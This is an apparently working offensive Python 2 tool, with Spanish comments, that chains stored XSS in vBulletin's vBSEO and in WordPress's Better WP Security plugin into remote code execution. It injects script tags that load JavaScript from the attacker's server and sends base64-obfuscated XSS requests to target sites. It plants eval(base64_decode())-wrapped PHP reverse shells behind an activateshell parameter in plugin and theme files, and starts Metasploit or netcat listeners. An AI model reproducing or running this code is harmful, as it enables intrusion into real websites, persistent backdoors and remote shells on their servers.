#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Version: 2.0
# Author: Hans-Michael Varbaek / Dead_*88
# Company: Sense of Security / InformaticDeath
# Credits: MaXe / InterN0T / InformaticDeath
#
# Requerimientos:
# - Gnome
# - Bash
# - Msfconsole
# - Netcat (nc)
# 
# Escrito para:
# - Python 2.7.3
# ====================== #

# Librerias Estandar
import sys
import os

# Preparacion para payload
import re
import base64

# Para xploits y nuestro servidor HTTP
import random
import httplib
import socket
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

# Requiere onstantes
menu_actions = {}

# ====================== #
#   CLASES DEFINIDAS
# ====================== # 

# ANSI clase de color de la fuente
class fontcolors:
  RED = '\033[91m'
  GREEN = '\033[92m'
  YELLOW = '\033[93m'
  BLUE = '\033[94m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'

# vBSEO Clase de servidor web (LinkBack vulnerabilidad especifica)
class MyHandler(BaseHTTPRequestHandler):
  def do_GET(self):
    try:
      if self.path.endswith("%s.php" % evil_php): 
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        self.wfile.write('<html><head><title>%s</title>' % xss_title)
        self.wfile.write('</head><body><center><h1>vBSEO Stored Cross-site Scripting</h1><br /><br />') 
        self.wfile.write('<a href="%s" target="_blank">He encontrado este foro impresionante</a>' % target_link)
        self.wfile.write('</center></body></html>')
        return

      if self.path.endswith("%s.js" % evil_jsf): 
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(js_output) 
        return

      if self.path.endswith(""):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write('<html><head><title>Vacio</title></head><body><h1>Nada que ver aquí..</h1></body></html>')
        return
      
      return

    except IOError:
      self.send_error(404,'File Not Found: %s' % self.path)

# WordPress/generic (payload) clase de servidor web
class WordPressHandler(BaseHTTPRequestHandler):
  def do_GET(self):
    try:
      if self.path.endswith("x.js"): # Static for now
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(js_output)
        return

      if self.path.endswith(""):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write('<html><head><title>Vacio</title></head><body><h1>Nada que ver aquí..</h1></body></html>')
        return
      
      return

    except IOError:
      self.send_error(404,'File Not Found: %s' % self.path)

# ====================== #
#   FUNCIONES DE MENU
# ====================== #
 
# Menu principal
def main_menu():
  os.system('clear')
  print fontcolors.BLUE + fontcolors.BOLD
  print "   ========================╭===========╮╭──╮╭──╮"
  print "   │  DE XSS A RCE 2.0    ││ Main Menu ││8 ││8 │"
  print "   ========================╰===========╯╰──╯╰──╯"
  print fontcolors.ENDC
  print fontcolors.BOLD + "   Elegir qué exploit usar: (OSVDB-ID)" + fontcolors.ENDC
  print " ╔=================================================╗"
  print " ║ [1] vBulletin - vBSEO XSS (70854)               ║"
  print " ║ [2] WordPress - Better WP Security XSS (95884)  ║"
  print " ║                                                 ║"
  print " ║ [?] Drupal (A ser implementado)                 ║"
  print " ║ [?] Joomla (A ser implementado)                 ║"
  print " ╚=================================================╝"
  print fontcolors.RED + "\n q. Salir\n" + fontcolors.ENDC
  choose_menu(exec_menu, 0, 0)
  return

# vBulletin menu
def menu1():
  global exploit_selection
  exploit_selection="vBSEO"
  print fontcolors.BLUE + fontcolors.BOLD
  print "   ╭──────────────────────╮╭───────────╮╭──╮╭──╮"
  print "   │  DE XSS A RCE 2.0    ││ vBulletin ││ 8││ 8│"
  print "   ╰──────────────────────╯╰───────────╯╰──╯╰──╯"
  print fontcolors.ENDC
  print fontcolors.BOLD + "   Elegir qué payload usar:" + fontcolors.ENDC
  print " ╔===============================================╗"
  print " ║ [1] Nuevo plugin (misc.php hook)              ║"
  print " ║                                               ║"
  print " ║                                               ║"
  print " ║                                               ║"
  print " ║ [9] Regresar                                  ║"
  print " ╚===============================================╝"
  print fontcolors.RED + "\n q. Salir\n" + fontcolors.ENDC
  choose_menu(exec_sub_menu, vbulletin_menu, 1)
  return

# WordPress menu
def menu2():
  global exploit_selection
  exploit_selection="BetterWPSecurity"
  print fontcolors.BLUE + fontcolors.BOLD
  print "   ╭======================╮╭───────────╮╭──╮╭──╮"
  print "   │  DE XSS A RCE 2.0    ││ WordPress ││ 8││ 8│"
  print "   ╰======================╯╰───────────╯╰──╯╰──╯"
  print fontcolors.ENDC
  print fontcolors.BOLD + "   Elegir qué payload usar:" + fontcolors.ENDC
  print " ╔================================================╗"
  print " ║ [1] WPSEO (robots.txt & .htaccess)             ║"
  print " ║ [2] WordPress Tema actual (footer.php)         ║"
  print " ║ [3] WordPress Hello Plugin (hello.php)         ║"
  print " ║                                                ║"
  print " ║ [9] Regresar                                   ║"
  print " ╚================================================╝"
  print fontcolors.RED + "\n q. Salir\n" + fontcolors.ENDC
  choose_menu(exec_sub_menu, wordpress_menu, 2)
  return

# Payload menu
def payload_menu_func(origin):
  print fontcolors.BLUE + fontcolors.BOLD
  print "   ╭──────────────────────╮╭───────────╮╭──╮╭──╮"
  print "   │  DE XSS A RCE 2.0    ││ Payloads  ││ 8││ 8│"
  print "   ╰──────────────────────╯╰───────────╯╰──╯╰──╯"
  print fontcolors.ENDC
  print fontcolors.BOLD + "   Elegir qué shell usar:" + fontcolors.ENDC
  print " ╔════════════════════════════════════════════════╗"
  print " ║ [1] Reverse Meterpreter (PHP)                  ║"
  print " ║ [2] PentestMonkey Reverse PHP Shell            ║"
  print " ║                                                ║"
  print " ║                                                ║"
  print " ║ [9] Regresar                                   ║"
  print " ╚════════════════════════════════════════════════╝"
  print fontcolors.RED + "\n q. Salir\n" + fontcolors.ENDC
  choose_menu(exec_sub_menu, payload_menu, origin)
  return

def preparePayloadBanner():
  print fontcolors.BLUE + fontcolors.BOLD
  print "   ╭──────────────────────╮╭───────────╮╭──╮╭──╮"
  print "   │  DE XSS A RCE 2.0    ││ Config    ││ 8││ 8│"
  print "   ╰──────────────────────╯╰───────────╯╰──╯╰──╯"
  print fontcolors.ENDC

# Seleccion de menu handle
def choose_menu(MenuType, cms_actions, origin):
  try:
    choice = raw_input(fontcolors.BOLD + fontcolors.BLUE+ " >>  " + fontcolors.ENDC)
  except KeyboardInterrupt:
    print fontcolors.YELLOW + "\n [!] CTRL+C detectado, cerrando." + fontcolors.ENDC
    sys.exit()
  MenuType(choice, cms_actions, origin)

# Ejecutar la opcion de menu principal
def exec_menu(choice, cms_actions, origin):
  os.system('clear')
  ch = choice.lower()
  if ch == '':
    menu_actions['main_menu']()
  else:
    try:
      menu_actions[ch]()
    except KeyError:
      print " [!] Seleccion invalida, intentelo de nuevo.\n"
      menu_actions['main_menu']()
  return

# Ejecutar la opcion de submenu
def exec_sub_menu(choice, sub_actions, origin):
  os.system('clear')
  ch = choice.lower()
  if ch == '':
    menu_actions[origin]() # Volver al sub-menu de donde venimos , no el menu principal
  else:
    try:
      sub_actions[ch]() # Entrar en el sub-menu, siguiente nivel para elegir e.g. tipo de payload
    except KeyError:
      print " [!] Seleccion invalida, Intentelo de nuevo.\n"
      menu_actions[origin]() # Volver al sub-menu de donde venimos , no el menu principal
  return

# Regresar al menu principal
def back():
  menu_actions['main_menu']()

# Salir del programa
def exit():
  sys.exit()


# vBulletin menu
def vbmenu1():
  global payload_selection
  payload_selection="vb_misc"
  payload_menu_func(1)
  # vBulletin New Plugin (misc.php hook)


# WordPress menu
def wpmenu1():
  global payload_selection
  payload_selection="wpseo"
  payload_menu_func(2)
  # WordPress WPSEO (robots.txt & .htaccess)

def wpmenu2():
  global payload_selection
  payload_selection="wp_footer_theme"
  payload_menu_func(2)
  # WordPress Current Theme (footer.php)
    
def wpmenu3():
  global payload_selection
  payload_selection="wp_hello_plugin"
  payload_menu_func(2)
  # WordPress Hello Plugin (hello.php)


# =============================== #
# EXPLOITS Y PAYLOADS FUNCIONALES
# =============================== # 

# Payload menus
def meterpreter():
  global php_selection
  php_selection="meterpreter"
  php_output = preparePayload(php_selection) # Stores our configured PHP shell
  global js_output
  js_output = updateJavaScriptPayload(payload_selection,php_output) # Stores our final JavaScript payload
  writeRCfile() # Escribiendo un archivo RC para / Write an RC file for Metasploit's Msfconsole
  rcfile = '/tmp/xsser.rc'
  os.system('gnome-terminal --title="Metasploit Multi Handler" --hide-menubar -e "bash -c \'echo [*] Ejecutando metasploit...; msfconsole -r '+rcfile+'; exec bash\'"')
  handleExploit(exploit_selection,js_output,lhost)

def pentestmonkey():
  global php_selection
  php_selection="pentestmonkey"
  php_output = preparePayload(php_selection) # Stores our configured PHP shell
  global js_output
  js_output = updateJavaScriptPayload(payload_selection,php_output) # Stores our final JavaScript payload
  os.system('gnome-terminal --title="Netcat Listener" --hide-menubar -e "bash -c \'echo [*] Ejecutando netcat...; nc -lnvp '+lport+' -s '+lhost+'; exec bash\'"')
  handleExploit(exploit_selection,js_output,lhost)

def writeRCfile():
  input = "use multi/handler\n\
set payload php/meterpreter/reverse_tcp\n\
set LHOST "+lhost+"\n\
set LPORT "+lport+"\n\
run -j"
  file = open('/tmp/xsser.rc','w')
  file.write(input)
  file.close()

# Preferiblemente, esta funcion necesita para cargar/importar el modulo seleccionado exploit y ejecutarlo en un futuro proximo.
def handleExploit(exploit,js_payload,localhost):
  if exploit == 'vBSEO':
   try:
    global evil_php
    global evil_jsf
    global xss_title
    global target_link
    http_port = 80 # Para que escuche en el puerto. En realidad no se nececita ser dinamico en el momento.
    evil_php = "%s%s%s" % (random.randrange(0, 253),random.randrange(1, 256),random.randrange(0, 255))
    evil_jsf = "%s%s%s" % (random.randrange(1, 257),random.randrange(0, 254),random.randrange(1, 258))
    xss_title = 'El sitio web amigable" size="70" dir="ltr" tabindex="1"><script src="http://%s:%s/%s.js"></script><br ' % (localhost,http_port,evil_jsf)
    print " [?] Es necesario introducir una URL para el exploit."
    print " [?] Ejemplo: http://forum-site.tld/1234-a-nice-thread.html\n"
    target_link = raw_input(fontcolors.BOLD+fontcolors.BLUE+"  >> "+fontcolors.ENDC)
    try:
      server = HTTPServer((localhost, http_port), MyHandler)
      print fontcolors.BLUE+fontcolors.BOLD+'\n\t╔═════════════════════════════╗'
      print '\t║ Started Payload HTTP Server ║'
      print '\t╚═════════════════════════════╝'
      print fontcolors.ENDC
      print ' [*] Sirviendo archivo de ataque: http://%s:%s/%s.php ' % (localhost,http_port,evil_php)
      print ' [*] Sirviendo archivo payload desde: http://%s:%s/%s.js ' % (localhost,http_port,evil_jsf)
      print ' [!] Busque: "'+fontcolors.BLUE+fontcolors.BOLD+'misc.php?activateshell=true'+fontcolors.ENDC+'", para activar el payload.'
      print ' [?] Presione CTRL+C para detener el servidor y salir del script. \n'
      print '-------------- HTTP Requests Below --------------'
      server.serve_forever() 
    except KeyboardInterrupt: # Obtener todas las interrupciones de teclado inesperados
      print fontcolors.YELLOW + "\n [!] CTRL+C detectado, cerrando." + fontcolors.ENDC
      server.socket.close() 
      sys.exit(1)
   except KeyboardInterrupt: # Obtener todas las interrupciones de teclado inesperados
    print fontcolors.YELLOW + "\n [!] CTRL+C detectado, cerrando." + fontcolors.ENDC
    sys.exit(1)
  elif exploit == 'BetterWPSecurity':
   try:
    if payload_selection == 'wp_hello_plugin':
      activation_file = "/wp-content/plugins/hello.php"
    elif payload_selection == 'wp_footer_theme':
      activation_file = "/"
    elif payload_selection == 'wpseo':
      activation_file = "/robots.txt"
    else:
      activation_file = "Unknown Payload - Restart Script"
      sys.exit()
    unencoded_payload = '<script src="http://'+localhost+'/x.js"></script>'
    base64_payload = '"><script>document.write(atob(/'+base64.b64encode(unencoded_payload)+'/.source))</script>'
    fourohfour_url = "%s%s%s.php?" % (random.randrange(0, 235),random.randrange(1, 214),random.randrange(0, 135))
    print " [?] Es necesario introducir una URL para el exploit. (Sin barra / final)"
    print " [?] Ejemplo: http://wordpress.tld\n"
    target_host = raw_input(fontcolors.BOLD+fontcolors.BLUE+"  >> "+fontcolors.ENDC)
    striptarget = re.compile('(http://|https://)')
    newtarget = striptarget.sub('', target_host)
    try:
      conn = httplib.HTTPConnection(newtarget, 80)
      conn.request("GET", "/"+fourohfour_url+base64_payload) 
      resp = conn.getresponse()
      output = resp.read()
      if resp.status == 404:
        print "\n [*] 404 received, checking that WordPress handled the error."
        if re.search("(That page can)", output):
          print " [*] It looks like WordPress handled the injection."
          http_port = 80 # Para que escuche en el puerto. En realidad no se nececita ser dinamico en el momento.
          try:
            server = HTTPServer((localhost, http_port), WordPressHandler)
            print fontcolors.BLUE+fontcolors.BOLD+'\n\t╔═════════════════════════════╗'
            print '\t║ Started Payload HTTP Server ║'
            print '\t╚═════════════════════════════╝'
            print fontcolors.ENDC
            print ' [*] Serving payload file from: http://%s:%s/x.js ' % (localhost,http_port)
            print ' [!] Browse to: "'+fontcolors.BLUE+fontcolors.BOLD+activation_file+'?activateshell=true'+fontcolors.ENDC+'", to activate the payload.'
            print ' [?] Press CTRL+C to stop the server and exit the script. \n'
            print '-------------- HTTP Requests Below --------------'
            server.serve_forever()
          except KeyboardInterrupt:
            server.socket.close()
            sys.exit()
        else:
          print " [!] El servidor web se encarga de la pagina de error 404, es decir, la inyeccion no se produjo dentro de una mejor seguridad wp."
    except Exception as e:
      print " [!] Ocurrió un error: %s\n[!] cerrando." % e
      sys.exit(1)
   except KeyboardInterrupt:
    print fontcolors.YELLOW + "\n [!] CTRL+C detectado, cerrando." + fontcolors.ENDC
    sys.exit(1)
  else:
    print " [!] Exploit invalido, dejar de fumar :3 ."
    sys.exit()

# Update JavaScript payload
def updateJavaScriptPayload(payload_type,php_input):
 try:
  if payload_type == 'vb_misc':
    payload_file = open("Payloads/javascript/vbulletin_legacy.js") # Misc_Start vBulletin Hook (misc.php)
  elif payload_type == 'wpseo':
    payload_file = open("Payloads/javascript/wordpress_legacy.js") # WPSEO (robots.txt and .htaccess)
  elif payload_type == 'wp_footer_theme':
    payload_file = open("Payloads/javascript/wordpress_theme.js") # WordPress Core Theme (footer.php)
  elif payload_type == 'wp_hello_plugin':
    payload_file = open("Payloads/javascript/wordpress_plugin.js") # WordPress Core Plugin (hello.php)
  else:
    print " [!] Payload invalido, dejar de fumar."
    sys.exit()
  payload_replace = re.compile('(PHP_PAYLOAD)')
  payload_output = payload_replace.sub(php_input, payload_file.read())
  return payload_output
 except KeyboardInterrupt:
   print fontcolors.YELLOW + "\n [!] CTRL+C detectado, cerrando." + fontcolors.ENDC
   sys.exit()

# Based on the vbseo.py preparePayload function
# Optimisar en un futoro la version / Optimise in a future version
def preparePayload(option):
 try:
  global lhost
  global lport
  if option == 'meterpreter':
    preparePayloadBanner()
    lhost = raw_input(" [?] Enter an IP address: ")
    lport = raw_input(" [?] Enter a listening port: ")
    payload_shell = open('Shells/meterpreter/meterpreter.php')
    find_host = re.compile('(LOCALHOST)')
    add_host = find_host.sub(lhost,payload_shell.read())
    find_port = re.compile('(LOCALPORT)')
    add_port = find_port.sub(lport,add_host)
    stripspace = re.compile('[\t\n\r]')
    filepart2 = stripspace.sub('', add_port)
    payload_input_shell = "if($_GET['activateshell']=='true') { %s } " % filepart2
    payload_insert = "eval(base64_decode(\""+base64.b64encode(payload_input_shell)+"\"));"
    return payload_insert
  elif option == 'pentestmonkey':
    preparePayloadBanner()
    lhost = raw_input(" [?] Enter an IP address: ")
    lport = raw_input(" [?] Enter a listening port: ")
    payload_shell = open('Shells/php-reverse-shell-1.0/php-reverse-shell.php')
    find_host = re.compile('(LOCALHOST)')
    add_host = find_host.sub(lhost,payload_shell.read())
    find_port = re.compile('(LOCALPORT)')
    add_port = find_port.sub(lport,add_host)
    stripcomments = re.compile('//.*?\n|/\*.*?\*/')
    filepart1 = stripcomments.sub('', add_port)
    stripspace = re.compile('[\t\n]')
    filepart2 = stripspace.sub('', filepart1)
    payload_input_shell = "if($_GET['activateshell']=='true') { %s } " % filepart2
    payload_insert = "eval(base64_decode(\""+base64.b64encode(payload_input_shell)+"\"));"
    return payload_insert
  else:
    print " [!] Invalid payload, quitting."
    sys.exit()
 except KeyboardInterrupt:
   print fontcolors.YELLOW + "\n [!] CTRL+C detectado, cerrando." + fontcolors.ENDC
   sys.exit()
  


# ====================== #
#  DEFINICIONES DE MENU
# ====================== #
 
# Definicion del menu
menu_actions = {
  'main_menu': main_menu,
  '1': menu1,
  '2': menu2,
  '9': back,
  'q': exit,
}

vbulletin_menu = {
  '1': vbmenu1,
  '9': back,
  'q': exit,
}

wordpress_menu = {
  '1': wpmenu1,
  '2': wpmenu2,
  '3': wpmenu3,
  '9': back,
  'q': exit,
}

payload_menu = {
  '1': meterpreter,
  '2': pentestmonkey,
  '9': back,
  'q': exit,
}
 
# ====================== #
#    PROGRAMA PRINCIPAL
# ====================== #
 
# Programa principal
if __name__ == "__main__":
  # Launch our main menu
  main_menu()
